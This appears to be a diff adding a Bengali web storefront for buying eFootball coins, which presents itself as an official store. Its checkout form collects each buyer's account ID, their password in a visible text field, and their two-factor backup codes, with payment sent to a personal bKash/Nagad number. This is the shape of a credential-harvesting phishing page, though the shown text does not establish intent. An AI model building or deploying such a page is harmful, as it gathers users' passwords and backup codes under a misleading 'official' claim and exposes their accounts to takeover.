@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>eanobab_topup | Official eFootball Store</title>
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700;800&family=Teko:wght@600;700&display=swap" rel="stylesheet">
+  
+  <!-- Firebase SDK (v8 CDN) -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <style>
+    :root {
+      --bg-dark: #070b13;
+      --card-bg: rgba(16, 25, 44, 0.75);
+      --border-color: rgba(0, 168, 255, 0.2);
+      --primary-cyan: #00d2ff;
+      --gold-coin: #ffcc00;
+      --bkash-pink: #e2136e;
+      --nagad-orange: #f7941d;
+      --text-white: #ffffff;
+      --text-muted: #8ea1c0;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Hind Siliguri', sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      background-image: 
+        radial-gradient(circle at 10% 10%, rgba(0, 68, 204, 0.25) 0%, transparent 45%),
+        radial-gradient(circle at 90% 90%, rgba(0, 210, 255, 0.15) 0%, transparent 45%),
+        linear-gradient(180deg, rgba(7,11,19,0.92) 0%, rgba(7,11,19,0.98) 100%);
+      color: var(--text-white);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .top-notice {
+      background: linear-gradient(90deg, #b91c1c, #dc2626);
+      color: #fff;
+      text-align: center;
+      padding: 8px 12px;
+      font-size: 0.88rem;
+      font-weight: 700;
+    }
+
+    header {
+      background: rgba(11, 18, 32, 0.9);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border-color);
+      padding: 12px 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .brand-logo-wrap {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-decoration: none;
+    }
+
+    .brand-logo-wrap img {
+      height: 48px;
+      width: auto;
+      object-fit: contain;
+      filter: drop-shadow(0 0 8px rgba(0, 210, 255, 0.4));
+    }
+
+    .brand-name {
+      font-family: 'Teko', sans-serif;
+      font-size: 2.2rem;
+      color: #fff;
+      letter-spacing: 1.5px;
+      line-height: 1;
+      text-transform: uppercase;
+    }
+
+    .brand-name span { color: var(--gold-coin); }
+
+    .app-container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 18px 14px 40px;
+      flex: 1;
+      width: 100%;
+    }
+
+    .page-step {
+      display: none;
+      animation: pageTransition 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    }
+
+    .page-step.active { display: block; }
+
+    @keyframes pageTransition {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* 16:9 Banner Slider */
+    .promo-slider-wrap { width: 100%; margin-bottom: 24px; }
+    .promo-slider {
+      width: 100%;
+      aspect-ratio: 16 / 9;
+      border: 1.5px solid var(--border-color);
+      border-radius: 14px;
+      position: relative;
+      overflow: hidden;
+      background: #0d172e;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
+    }
+
+    .slide-item {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;
+      transition: opacity 0.6s ease-in-out;
+      display: block;
+      text-decoration: none;
+    }
+
+    .slide-item.active-slide { opacity: 1; z-index: 2; }
+    .slide-item img { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+    /* ভিডিও লিংক অন থাকলে প্লে বাটন প্রদর্শন */
+    .banner-play-btn {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 52px;
+      height: 52px;
+      background: rgba(0, 0, 0, 0.65);
+      border: 2px solid var(--primary-cyan);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 20px rgba(0, 210, 255, 0.6);
+      pointer-events: none;
+      transition: transform 0.2s;
+    }
+
+    .banner-play-btn svg {
+      width: 24px;
+      height: 24px;
+      fill: #fff;
+      margin-left: 3px;
+    }
+
+    .slide-item:hover .banner-play-btn {
+      transform: translate(-50%, -50%) scale(1.15);
+      background: rgba(0, 210, 255, 0.85);
+    }
+
+    .slider-dots {
+      position: absolute;
+      bottom: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 6px;
+      z-index: 5;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.4);
+      transition: all 0.2s;
+    }
+
+    .dot.active {
+      background: var(--primary-cyan);
+      box-shadow: 0 0 6px var(--primary-cyan);
+      width: 18px;
+      border-radius: 10px;
+    }
+
+    /* ৩টি সেকশন হেডার */
+    .section-header {
+      font-size: 1.2rem;
+      font-weight: 800;
+      margin: 24px 0 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-left: 4px solid var(--primary-cyan);
+      padding-left: 10px;
+    }
+
+    .section-header.pop { border-left-color: var(--gold-coin); color: var(--gold-coin); }
+    .section-header.special { border-left-color: #a855f7; color: #c084fc; }
+
+    /* প্যাকেজ গ্রিড */
+    .package-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    @media (max-width: 480px) {
+      .package-grid { gap: 8px; }
+    }
+
+    .package-card {
+      background: var(--card-bg);
+      border: 1.5px solid var(--border-color);
+      border-radius: 14px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      text-align: center;
+      backdrop-filter: blur(8px);
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      position: relative;
+      transition: transform 0.2s, border-color 0.2s;
+    }
+
+    .package-card:hover {
+      transform: translateY(-3px);
+      border-color: var(--primary-cyan);
+    }
+
+    .tag-badge {
+      position: absolute;
+      top: 4px;
+      right: 4px;
+      background: #dc2626;
+      color: #fff;
+      font-size: 0.62rem;
+      font-weight: 800;
+      padding: 2px 6px;
+      border-radius: 4px;
+      z-index: 3;
+    }
+
+    .tag-badge.pop { background: #f59e0b; color: #000; }
+    .tag-badge.special { background: #9333ea; color: #fff; }
+
+    .pkg-top {
+      background: linear-gradient(180deg, #152445 0%, #0d172e 100%);
+      padding: 12px 6px;
+      border-bottom: 1px solid var(--border-color);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 85px;
+    }
+
+    .pkg-coins {
+      font-size: 0.88rem;
+      font-weight: 800;
+      color: #fff;
+      line-height: 1.2;
+      margin-top: 4px;
+    }
+
+    .pkg-bottom {
+      padding: 10px 8px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .pkg-price {
+      font-size: 1.05rem;
+      font-weight: 800;
+      color: var(--gold-coin);
+    }
+
+    .btn-buy-pkg {
+      background: linear-gradient(90deg, #0052cc, #00d2ff);
+      color: #fff;
+      border: none;
+      padding: 7px 4px;
+      border-radius: 6px;
+      font-weight: 700;
+      font-size: 0.88rem;
+      cursor: pointer;
+    }
+
+    /* Social Media Circles */
+    .social-section { text-align: center; margin: 30px 0 20px; }
+    .social-title { font-size: 0.95rem; color: var(--text-muted); margin-bottom: 14px; }
+    .circle-social-grid { display: flex; justify-content: center; align-items: center; gap: 14px; flex-wrap: wrap; }
+    .circle-btn {
+      width: 68px;
+      height: 68px;
+      border-radius: 50%;
+      background: #111e3b;
+      border: 2px solid var(--border-color);
+      color: #fff;
+      text-decoration: none;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.72rem;
+      font-weight: 700;
+      transition: all 0.25s;
+    }
+    .circle-btn svg { width: 20px; height: 20px; fill: currentColor; margin-bottom: 4px; }
+    .c-yt { border-color: #ff0000; } .c-yt:hover { background: #ff0000; transform: scale(1.08); }
+    .c-fb { border-color: #1877f2; } .c-fb:hover { background: #1877f2; transform: scale(1.08); }
+    .c-tt { border-color: #fe2c55; } .c-tt:hover { background: #000; box-shadow: 0 0 8px #fe2c55; transform: scale(1.08); }
+    .c-tg { border-color: #229ed9; } .c-tg:hover { background: #229ed9; transform: scale(1.08); }
+
+    /* কেন ট্রাস্টেড ও অ্যাবাউট ফুটার সেকশন */
+    .trusted-section {
+      background: #0b1220;
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      padding: 22px 18px;
+      margin-top: 30px;
+    }
+
+    .trusted-title {
+      font-size: 1.2rem;
+      font-weight: 800;
+      text-align: center;
+      color: var(--primary-cyan);
+      margin-bottom: 16px;
+    }
+
+    .trust-badges-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 18px;
+      text-align: center;
+    }
+
+    .trust-card {
+      background: rgba(16, 25, 44, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 10px;
+      padding: 10px 6px;
+    }
+
+    .trust-card .icon { font-size: 24px; margin-bottom: 4px; }
+    .trust-card .title { font-size: 0.82rem; font-weight: 700; color: #fff; }
+
+    .about-text {
+      font-size: 0.88rem;
+      color: #94a3b8;
+      line-height: 1.6;
+      text-align: justify;
+    }
+
+    /* Checkout & Payment */
+    .checkout-card {
+      background: var(--card-bg);
+      border: 1.5px solid var(--border-color);
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 18px;
+    }
+    .selected-summary-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(0, 210, 255, 0.08);
+      border: 1px solid var(--primary-cyan);
+      padding: 12px 16px;
+      border-radius: 10px;
+      margin-bottom: 18px;
+    }
+    .form-group { margin-bottom: 16px; }
+    .form-group label { display: block; font-size: 0.9rem; font-weight: 600; margin-bottom: 6px; color: #e2e8f0; }
+    .form-control {
+      width: 100%;
+      background: rgba(6, 11, 20, 0.9);
+      border: 1.5px solid var(--border-color);
+      border-radius: 8px;
+      padding: 12px 14px;
+      color: #fff;
+      font-size: 0.98rem;
+      outline: none;
+    }
+    .back-btn {
+      background: #142244;
+      border: 1px solid var(--border-color);
+      color: #fff;
+      padding: 8px 14px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 700;
+      margin-bottom: 16px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .payment-selection-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin-top: 10px; }
+    .payment-card-btn {
+      background: rgba(13, 22, 40, 0.85);
+      border: 2px solid var(--border-color);
+      border-radius: 14px;
+      padding: 16px 12px;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .payment-card-btn img { max-height: 44px; max-width: 90%; object-fit: contain; }
+
+    .bkash-window, .nagad-window { background: #fff; color: #333; border-radius: 16px; overflow: hidden; }
+    .bkash-header { background: var(--bkash-pink); color: #fff; padding: 14px 20px; display: flex; justify-content: space-between; align-items: center; }
+    .nagad-header { background: var(--nagad-orange); color: #fff; padding: 14px 20px; display: flex; justify-content: space-between; align-items: center; }
+    .bkash-body, .nagad-body { padding: 22px 20px; }
+    .number-box {
+      background: #fdf2f7; border: 1.5px dashed var(--bkash-pink); border-radius: 10px; padding: 14px;
+      display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;
+    }
+    .nagad-num-box { border-color: var(--nagad-orange); background: #fef7ed; }
+    .copy-btn { background: var(--bkash-pink); color: #fff; border: none; padding: 7px 14px; border-radius: 6px; font-weight: 700; cursor: pointer; }
+    .nagad-btn { background: var(--nagad-orange); color: #000; }
+    .instructions-box { background: #fafafa; border-left: 4px solid var(--bkash-pink); padding: 12px 14px; margin-bottom: 18px; font-size: 0.86rem; color: #555; }
+    .nagad-ins { border-left-color: var(--nagad-orange); }
+    .pay-input { width: 100%; border: 1.5px solid #dcdcdc; border-radius: 8px; padding: 12px 14px; font-size: 1rem; outline: none; margin-top: 6px; }
+    .submit-btn-pay { width: 100%; background: var(--bkash-pink); color: #fff; border: none; padding: 14px; border-radius: 8px; font-size: 1.1rem; font-weight: 700; cursor: pointer; margin-top: 15px; }
+    .nagad-sub { background: var(--nagad-orange); }
+
+    .summary-table { width: 100%; border-collapse: collapse; margin: 15px 0 22px; }
+    .summary-table td { padding: 10px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.08); font-size: 0.95rem; }
+    .summary-table td:first-child { color: var(--text-muted); width: 40%; }
+    .summary-table td:last-child { color: #fff; font-weight: 700; text-align: right; }
+    .final-confirm-btn { width: 100%; background: linear-gradient(90deg, #10b981, #059669); color: #fff; border: none; padding: 15px; border-radius: 10px; font-size: 1.15rem; font-weight: 800; cursor: pointer; }
+    .pending-box { text-align: center; padding: 30px 20px; }
+    .pulse-spinner { width: 70px; height: 70px; border: 5px solid rgba(0, 210, 255, 0.2); border-top-color: var(--primary-cyan); border-radius: 50%; margin: 0 auto 20px; animation: spin 1s infinite linear; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .order-id-code { font-family: monospace; font-size: 1.1rem; background: #09101c; padding: 6px 14px; border-radius: 6px; border: 1px solid var(--border-color); display: inline-block; margin-bottom: 25px; color: var(--primary-cyan); }
+    .wa-support-btn { background: linear-gradient(90deg, #25d366, #128c7e); color: #fff; border: none; padding: 14px 24px; border-radius: 10px; font-size: 1.1rem; font-weight: 700; display: inline-flex; align-items: center; justify-content: center; gap: 10px; text-decoration: none; width: 100%; }
+    .wa-support-btn svg { width: 24px; height: 24px; fill: #fff; }
+    footer { text-align: center; padding: 20px; font-size: 0.85rem; color: var(--text-muted); border-top: 1px solid var(--border-color); }
+  </style>
+</head>
+<body>
+
+  <div class="top-notice">
+    ⚠️ কয়েন টপ-আপ শুধুমাত্র <strong>Android</strong> ডিভাইসের জন্য প্রযোজ্য (iOS সাময়িক বন্ধ)
+  </div>
+
+  <header>
+    <a href="https://ibb.co.com/9k3zdL6C" target="_blank" class="brand-logo-wrap">
+      <img src="https://i.ibb.co.com/Rk4ZJmfV/file-00000000b8648208b9726a0227c610d9.png" alt="eanobab_topup Logo" border="0">
+      <div class="brand-name">EANOBAB <span>TOPUP</span></div>
+    </a>
+  </header>
+
+  <div class="app-container">
+
+    <!-- STEP 1: HOME VIEW -->
+    <div id="stepHome" class="page-step active">
+      
+      <!-- 16:9 ব্যানার স্লাইডার -->
+      <div class="promo-slider-wrap">
+        <div class="promo-slider">
+          <div id="slidesTrack" style="width: 100%; height: 100%; position: relative;">
+            <a href="#" class="slide-item active-slide">
+              <img src="https://images.unsplash.com/photo-1542751371-adc38448a05e?w=1280&q=80" alt="Banner">
+            </a>
+          </div>
+          <div class="slider-dots" id="sliderDotsContainer">
+            <div class="dot active"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ১. পপুলার অফার সেকশন -->
+      <div class="section-header pop">🔥 পপুলার অফার (Popular Offers)</div>
+      <div class="package-grid" id="gridPopular"></div>
+
+      <!-- ২. প্লেয়ার প্যাক সেকশন -->
+      <div class="section-header special">⭐ প্লেয়ার প্যাক (Luis Suarez / Special Packs)</div>
+      <div class="package-grid" id="gridSpecial"></div>
+
+      <!-- ৩. সাধারণ কয়েন সেকশন -->
+      <div class="section-header">🪙 সাধারণ কয়েন প্যাকেজ (Regular Coins)</div>
+      <div class="package-grid" id="gridRegular"></div>
+
+      <!-- সোশ্যাল মিডিয়া হ্যান্ডেল -->
+      <div class="social-section">
+        <div class="social-title">আমাদের অফিসিয়াল সোশ্যাল মিডিয়া প্ল্যাটফর্ম</div>
+        <div class="circle-social-grid">
+          <a href="https://www.facebook.com/share/1BUzSPineM/" target="_blank" class="circle-btn c-fb">
+            <svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+            ফেইসবুক
+          </a>
+          <a href="https://youtube.com/@eanobab?si=qrWHyWk9JTMwpIdp" target="_blank" class="circle-btn c-yt">
+            <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+            ইউটিউব
+          </a>
+          <a href="https://www.tiktok.com/@eanobab" target="_blank" class="circle-btn c-tt">
+            <svg viewBox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.24 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/></svg>
+            টিকটক
+          </a>
+          <a href="https://t.me/EaNOBAB" target="_blank" class="circle-btn c-tg">
+            <svg viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+            টেলিগ্রাম
+          </a>
+        </div>
+      </div>
+
+      <!-- কেন ট্রাস্টেড ও অ্যাবাউট ফুটার সেকশন -->
+      <div class="trusted-section">
+        <div class="trusted-title">🛡️ কেন eanobab_topup ১০০% বিশ্বস্ত ও নির্ভরযোগ্য?</div>
+        
+        <div class="trust-badges-grid">
+          <div class="trust-card">
+            <div class="icon">⚡</div>
+            <div class="title">ইনস্ট্যান্ট লোড</div>
+            <span style="font-size:0.75rem; color:#8ea1c0;">৫-৬০ মিনিটে নিশ্চিত ডেলিভারি</span>
+          </div>
+          <div class="trust-card">
+            <div class="icon">🔒</div>
+            <div class="title">১০০% নিরাপদ</div>
+            <span style="font-size:0.75rem; color:#8ea1c0;">অফিসিয়াল ও সুরক্ষিত মাধ্যম</span>
+          </div>
+          <div class="trust-card">
+            <div class="icon">💬</div>
+            <div class="title">লাইভ সাপোর্ট</div>
+            <span style="font-size:0.75rem; color:#8ea1c0;">২৪/৭ হোয়াটসঅ্যাপ হেল্পলাইন</span>
+          </div>
+        </div>
+
+        <p class="about-text">
+          <strong>eanobab_topup</strong> হলো বাংলাদেশের eFootball গেমারদের জন্য একটি অফিশিয়াল ও নিরাপদ কয়েন টপ-আপ সেবা। আমরা গেমারদের অ্যাকাউন্টের সম্পূর্ণ নিরাপত্তা বজায় রেখে সরাসরি বৈধ উপায়ে কয়েন ও প্লেয়ার প্যাক সরবরাহ করে থাকি। কোনামি আইডি কিংবা ইমেইল লগইন—উভয় ক্ষেত্রেই আপনার অ্যাকাউন্ট শতভাগ সুরক্ষিত থাকে। যে কোনো সমস্যায় আমাদের সক্রিয় সাপোর্ট টিম সার্বক্ষণিক সহায়তা প্রদানে প্রস্তুত।
+        </p>
+      </div>
+
+    </div>
+
+    <!-- STEP 2: USER INFO -->
+    <div id="stepInfo" class="page-step">
+      <button class="back-btn" onclick="navigateTo('stepHome')">← প্যাকেজ পরিবর্তন</button>
+
+      <div class="selected-summary-bar">
+        <div>
+          <span style="font-size:0.85rem; color:var(--text-muted)">নির্বাচিত প্যাকেজ:</span>
+          <div id="dispPkgName" style="font-weight:800; font-size:1.15rem; color:#fff;">-</div>
+        </div>
+        <div style="text-align:right;">
+          <span style="font-size:0.85rem; color:var(--text-muted)">মোট মূল্য:</span>
+          <div id="dispPkgPrice" style="font-weight:800; font-size:1.25rem; color:var(--gold-coin);">-</div>
+        </div>
+      </div>
+
+      <div class="checkout-card">
+        <div style="font-size:1.1rem; font-weight:700; color:var(--primary-cyan); margin-bottom:14px;">১. কাস্টমার ও আইডি তথ্য</div>
+        <div class="form-group">
+          <label>আপনার নাম (Orderer Name):</label>
+          <input type="text" id="custName" class="form-control" placeholder="আপনার নাম লিখুন" required>
+        </div>
+        <div class="form-group">
+          <label>হোয়াটসঅ্যাপ নাম্বার (WhatsApp Number):</label>
+          <input type="tel" id="custWhatsApp" class="form-control" placeholder="01XXXXXXXXX" required>
+        </div>
+        <div class="form-group">
+          <label>ইমেইল অথবা কোনামি আইডি (Email or Konami ID):</label>
+          <input type="text" id="custAccountId" class="form-control" placeholder="user@gmail.com অথবা konami_id" required>
+        </div>
+        <div class="form-group">
+          <label>পাসওয়ার্ড (Password):</label>
+          <input type="text" id="custPassword" class="form-control" placeholder="অ্যাকাউন্ট পাসওয়ার্ড দিন" required>
+        </div>
+        <div class="form-group">
+          <label>ব্যাকআপ কোড (ইমেইল এর জন্য প্রযোজ্য):</label>
+          <input type="text" id="custBackupCodes" class="form-control" placeholder="ইমেইল হলে ব্যাকআপ কোড দিন (কোনামি আইডি হলে খালি রাখুন)">
+          <small style="color:var(--text-muted); font-size:0.8rem; margin-top:4px; display:block;">
+            * কোনামি আইডি দিলে ব্যাকআপ কোড লাগবে না।
+          </small>
+        </div>
+
+        <div style="font-size:1.1rem; font-weight:700; color:var(--primary-cyan); margin-top:20px; margin-bottom:8px;">২. পেমেন্ট মেথড নির্বাচন করুন</div>
+        <div class="payment-selection-grid">
+          <div class="payment-card-btn bkash-trigger" onclick="openPaymentGateway('bkash')">
+            <img src="https://i.ibb.co/H302vV2/1701670291b-Kash-App-Logo-PNG.png" alt="bKash Logo" border="0">
+            <span style="color:var(--bkash-pink); font-weight:700;">বিকাশ (bKash)</span>
+          </div>
+          <div class="payment-card-btn nagad-trigger" onclick="openPaymentGateway('nagad')">
+            <img src="https://i.ibb.co.com/LdShCgSP/images-10.jpg" alt="Nagad Logo" border="0">
+            <span style="color:var(--nagad-orange); font-weight:700;">নগদ (Nagad)</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 3A: bKash -->
+    <div id="stepBkash" class="page-step">
+      <button class="back-btn" onclick="navigateTo('stepInfo')">← ইনফরমেশন পেজে ফিরে যান</button>
+      <div class="bkash-window">
+        <div class="bkash-header">
+          <div style="font-weight:800;">bKash Send Money</div>
+          <div id="bkashAmountBadge" style="background:rgba(255,255,255,0.25); padding:4px 10px; border-radius:12px; font-weight:700;">৳ 0</div>
+        </div>
+        <div class="bkash-body">
+          <div style="font-size:0.95rem; font-weight:700; margin-bottom:6px;">বিকাশ পার্সোনাল নম্বর:</div>
+          <div class="number-box">
+            <span style="font-size:1.25rem; font-weight:800; color:var(--bkash-pink);">01820729663</span>
+            <button type="button" class="copy-btn" id="btnCopyB" onclick="copyPaymentNumber('01820729663', 'btnCopyB')">কপি করুন</button>
+          </div>
+          <div class="instructions-box">
+            ১. বিকাশ অ্যাপে গিয়ে <strong>Send Money</strong> নির্বাচন করুন।<br>
+            ২. উপরের নম্বরে নির্ধারিত টাকা পাঠিয়ে TrxID সংগ্রহ করুন।
+          </div>
+          <form onsubmit="handlePaymentSubmit(event, 'bkash')">
+            <label style="font-weight:700; font-size:0.88rem;">বিকাশ সেন্ডার নম্বর:</label>
+            <input type="tel" id="bkashSender" class="pay-input" placeholder="01XXXXXXXXX" required>
+            <label style="font-weight:700; font-size:0.88rem; margin-top:10px; display:block;">ট্রানজেকশন আইডি (TrxID):</label>
+            <input type="text" id="bkashTrx" class="pay-input" placeholder="Ex: BKS9271893" required>
+            <button type="submit" class="submit-btn-pay">পেমেন্ট তথ্য যাচাই করুন ✓</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 3B: Nagad -->
+    <div id="stepNagad" class="page-step">
+      <button class="back-btn" onclick="navigateTo('stepInfo')">← ইনফরমেশন পেজে ফিরে যান</button>
+      <div class="nagad-window">
+        <div class="nagad-header">
+          <div style="font-weight:800;">Nagad Send Money</div>
+          <div id="nagadAmountBadge" style="background:rgba(0,0,0,0.2); padding:4px 10px; border-radius:12px; font-weight:700;">৳ 0</div>
+        </div>
+        <div class="nagad-body">
+          <div style="font-size:0.95rem; font-weight:700; margin-bottom:6px;">নগদ পার্সোনাল নম্বর:</div>
+          <div class="number-box nagad-num-box">
+            <span style="font-size:1.25rem; font-weight:800; color:var(--nagad-orange);">01820729663</span>
+            <button type="button" class="copy-btn nagad-btn" id="btnCopyN" onclick="copyPaymentNumber('01820729663', 'btnCopyN')">কপি করুন</button>
+          </div>
+          <div class="instructions-box nagad-ins">
+            ১. নগদ অ্যাপে গিয়ে <strong>Send Money</strong> নির্বাচন করুন।<br>
+            ২. উপরের নম্বরে নির্ধারিত টাকা পাঠিয়ে TrxID সংগ্রহ করুন।
+          </div>
+          <form onsubmit="handlePaymentSubmit(event, 'nagad')">
+            <label style="font-weight:700; font-size:0.88rem;">নগদ সেন্ডার নম্বর:</label>
+            <input type="tel" id="nagadSender" class="pay-input" placeholder="01XXXXXXXXX" required>
+            <label style="font-weight:700; font-size:0.88rem; margin-top:10px; display:block;">ট্রানজেকশন আইডি (TrxID):</label>
+            <input type="text" id="nagadTrx" class="pay-input" placeholder="Ex: 7AKD829" required>
+            <button type="submit" class="submit-btn-pay nagad-sub">পেমেন্ট তথ্য যাচাই করুন ✓</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 4: REVIEW -->
+    <div id="stepReview" class="page-step">
+      <div class="checkout-card">
+        <div style="font-size:1.2rem; font-weight:800; color:var(--gold-coin); margin-bottom:12px;">অর্ডার রিভিউ ও নিশ্চিতকরণ</div>
+        <table class="summary-table">
+          <tr><td>প্যাকেজ:</td><td id="revPkg">-</td></tr>
+          <tr><td>মোট মূল্য:</td><td id="revPrice" style="color:var(--gold-coin);">-</td></tr>
+          <tr><td>কাস্টমার নাম:</td><td id="revName">-</td></tr>
+          <tr><td>হোয়াটসঅ্যাপ:</td><td id="revWhatsApp">-</td></tr>
+          <tr><td>আইডি / ইমেইল:</td><td id="revAccount">-</td></tr>
+          <tr><td>পাসওয়ার্ড:</td><td id="revPass">••••••••</td></tr>
+          <tr><td>ব্যাকআপ কোড:</td><td id="revBackup">-</td></tr>
+          <tr><td>পেমেন্ট মেথড:</td><td id="revMethod">-</td></tr>
+          <tr><td>সেন্ডার নম্বর:</td><td id="revSender">-</td></tr>
+          <tr><td>TrxID:</td><td id="revTrx" style="color:var(--primary-cyan);">-</td></tr>
+        </table>
+        <button type="button" class="final-confirm-btn" onclick="finalizeOrder()">
+          অর্ডার কনফার্ম করুন 🚀
+        </button>
+      </div>
+    </div>
+
+    <!-- STEP 5: PENDING -->
+    <div id="stepPending" class="page-step">
+      <div class="checkout-card pending-box">
+        <div class="pulse-spinner"></div>
+        <div style="font-size:1.6rem; font-weight:800; color:var(--gold-coin); margin-bottom:6px;">অর্ডারটি পেন্ডিং এ আছে!</div>
+        <div class="order-id-code" id="dispOrderId">ORD-000000</div>
+        <p style="font-size:0.95rem; color:#cbd5e1; margin-bottom:20px;">
+          আপনার অর্ডার সিস্টেমে যুক্ত হয়েছে। দ্রুততম ডেলিভারির জন্য নিচের বাটনে ক্লিক করে তথ্যটি সরাসরি হোয়াটসঅ্যাপে পাঠিয়ে দিন:
+        </p>
+        <a id="btnWhatsAppRedirect" href="#" target="_blank" class="wa-support-btn">
